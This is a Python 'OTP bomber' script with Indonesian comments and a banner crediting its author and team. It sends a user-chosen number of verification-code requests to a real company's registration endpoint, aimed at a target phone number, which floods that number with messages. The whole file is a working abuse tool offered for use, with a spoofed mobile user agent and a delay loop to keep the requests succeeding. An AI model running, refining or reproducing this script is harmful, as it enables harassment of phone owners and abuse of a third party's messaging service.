# Filename: spam_tool_refactored.py

import os
import sys
import time
import requests

# --- Konstanta untuk Warna Terminal ---
class Colors:
    """Menyimpan kode warna ANSI untuk output terminal."""
    RESET = '\033[0m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    PURPLE = '\033[35m'
    CYAN = '\033[36m'

# --- Konstanta untuk API dan Konfigurasi ---
class Config:
    """Menyimpan pengaturan dan detail API."""
    API_URL_TEMPLATE = (
        "https://www.sobatbangun.com/otp-validation?"
        "p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&"
        "p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&"
        "_SB_Registration_Otp_Portlet_mobilePhoneNo={}"
    )
    USER_AGENT = (
        "Mozilla/5.0 (Linux; Android 9; vivo 1902) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/74.0.3729.136 Mobile Safari/537.36"
    )
    REQUEST_DELAY = 1  # Detik

# --- Konstanta untuk Teks Banner ---
BANNER_ART = f"""
{Colors.PURPLE}
.#######..########.....###....##.....##..##......##....###...
.##....##.##.....##...##.##...###...###..##..##..##...##.##..
.##.......##.....##..##...##..####.####..##..##..##..##...##.
..######..########..##.....##.##.###.##..##..##..##.##.....##
.......##.##........#########.##.....##..##..##..##.#########
..#....##.##........##.....##.##.....##..##..##..##.##.....##
..######..##........##.....##.##.....##...###..###..##.....##
{Colors.PURPLE}
{Colors.PURPLE}╔{'═'*46}╗
{Colors.PURPLE}║    {Colors.GREEN}Author  : MUIZ MAULANA                           {Colors.PURPLE}║
{Colors.PURPLE}║    {Colors.GREEN}YouTube : AVATAR ID                       {Colors.PURPLE}║
{Colors.PURPLE}║    {Colors.GREEN}Github  : https://github.com/muizka/Spam_5th_lalu   {Colors.PURPLE}║
{Colors.PURPLE}║    {Colors.GREEN}Team    : Cyber Java                  {Colors.PURPLE}║
{Colors.PURPLE}╚{'═'*46}╝
{Colors.GREEN}             [   {Colors.RESET}\x1b[041m SPAM WA UNLIMITED \x1b[00m{Colors.GREEN}   ]{Colors.RESET}
{Colors.PURPLE}
{Colors.PURPLE}╔{'═'*22}╗
{Colors.PURPLE}║ {Colors.GREEN}Contoh Nomor 08××××××××××   {Colors.PURPLE} ║
{Colors.PURPLE}╚{'═'*22}╝{Colors.RESET}
{Colors.RED}{'─'*50}{Colors.RESET}
"""

class Spammer:
    """
    Kelas utama untuk menangani logika spam OTP.
    """

    def __init__(self):
        """Inisialisasi objek Spammer."""
        self.target = None
        self.count = 0
        self.session = requests.Session()
        self.session.headers.update({'user-agent': Config.USER_AGENT})

    def _clear_screen(self):
        """Membersihkan layar terminal."""
        os.system('clear')

    def _display_banner(self):
        """Menampilkan banner program."""
        self._clear_screen()
        print(BANNER_ART)

    def _get_user_input(self):
        """Mendapatkan input dari pengguna (nomor target dan jumlah spam)."""
        try:
            self.target = input(f" {Colors.PURPLE}[{Colors.CYAN}?{Colors.RESET}] {Colors.GREEN}Masukkan Nomor Target : {Colors.RESET}")
            self.count = int(input(f" {Colors.PURPLE}[{Colors.CYAN}?{Colors.RESET}] {Colors.GREEN}Masukkan jumlah Spam  : {Colors.RESET}"))
            if not self.target.startswith('08'):
                print(f"{Colors.RED}[!] Nomor harus dimulai dengan '08'.{Colors.RESET}")
                return False
            return True
        except ValueError:
            print(f"{Colors.RED}[!] Input tidak valid. Mohon masukkan angka untuk jumlah spam.{Colors.RESET}")
            return False
        except KeyboardInterrupt:
            self._handle_exit()

    def _send_request(self):
        """Mengirim satu permintaan spam ke server."""
        try:
            url = Config.API_URL_TEMPLATE.format(self.target)
            response = self.session.get(url, timeout=10)
            
            if '"status":"success"' in response.text:
                return True
            else:
                return False
        except requests.exceptions.ConnectionError:
            print(f"\n{Colors.YELLOW}[!] Periksa Koneksi Internet anda !!{Colors.RESET}")
            return None # None menandakan error koneksi
        except requests.exceptions.Timeout:
            print(f"\n{Colors.YELLOW}[!] Permintaan timeout, coba lagi.{Colors.RESET}")
            return None

    def _handle_exit(self):
        """Menangani proses keluar dari program (Ctrl+C)."""
        print(f"\r{Colors.PURPLE}[{Colors.YELLOW}-{Colors.RESET}] {Colors.RED}Keluar dari program...{Colors.RESET}")
        sys.exit()

    def run(self):
        """Metode utama untuk menjalankan seluruh proses spam."""
        self._display_banner()
        
        if not self._get_user_input():
            return # Keluar jika input tidak valid

        print(f"\n{Colors.CYAN}[*] Memulai spam ke {self.target} sebanyak {self.count} kali...{Colors.RESET}")
        print(f"{Colors.RED}{'─'*50}{Colors.RESET}")
        
        for i in range(self.count):
            try:
                status = self._send_request()
                
                if status is True:
                    print(f"{Colors.PURPLE}[{Colors.GREEN}✓{Colors.RESET}] {Colors.GREEN}Success {Colors.YELLOW}{i+1}{Colors.RESET} spam ke {Colors.CYAN}{self.target}{Colors.RESET}")
                elif status is False:
                    print(f"{Colors.PURPLE}[{Colors.RED}✗{Colors.RESET}] {Colors.RED}Failed {Colors.RESET} spam ke {Colors.CYAN}{self.target}{Colors.RESET}")
                else: # status is None (error koneksi)
                    break # Hentikan loop jika ada error koneksi

                time.sleep(Config.REQUEST_DELAY)

            except KeyboardInterrupt:
                self._handle_exit()
        
        print(f"\n{Colors.GREEN}[+] Proses spam selesai.{Colors.RESET}")


def main():
    """Fungsi entry point untuk menjalankan aplikasi."""
    spammer = Spammer()
    spammer.run()

if __name__ == '__main__':

    main()
